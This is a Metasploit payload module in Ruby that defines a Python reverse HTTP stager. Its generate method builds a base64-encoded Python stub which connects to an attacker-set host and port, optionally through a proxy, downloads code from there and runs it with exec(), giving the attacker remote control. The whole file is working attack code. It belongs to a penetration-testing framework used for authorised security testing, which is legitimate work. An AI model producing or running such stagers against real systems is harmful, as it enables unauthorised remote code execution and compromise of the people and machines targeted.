##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/python/reverse_http'

module Metasploit4

  CachedSize = 466

  include Msf::Payload::Stager
  include Msf::Payload::Python::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
    ))

    register_options(
      [
        OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
        OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
      ], self.class)
  end

  #
  # Constructs the payload
  #
  def generate
    lhost = datastore['LHOST'] || '127.127.127.127'

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
    }

    if Rex::Socket.is_ipv6?(lhost)
      target_url = "http://[#{lhost}]"
    else
      target_url = "http://#{lhost}"
    end

    target_url << ':'
    target_url << datastore['LPORT'].to_s
    target_url << '/'
    target_url << generate_callback_uri

    proxy_host = datastore['PayloadProxyHost'].to_s
    proxy_port = datastore['PayloadProxyPort'].to_i

    cmd  = "import sys\n"
    if proxy_host == ''
      cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
    else
      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
        "http://[#{proxy_host}]:#{proxy_port}" :
        "http://#{proxy_host}:#{proxy_port}"

      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
      cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
    end

    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
    cmd << "exec(o.open('#{target_url}').read())\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    b64_stub  = "import base64,sys;exec(base64.b64decode("
    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
    b64_stub << Rex::Text.encode_base64(cmd)
    b64_stub << "')))"
    return b64_stub
  end

end
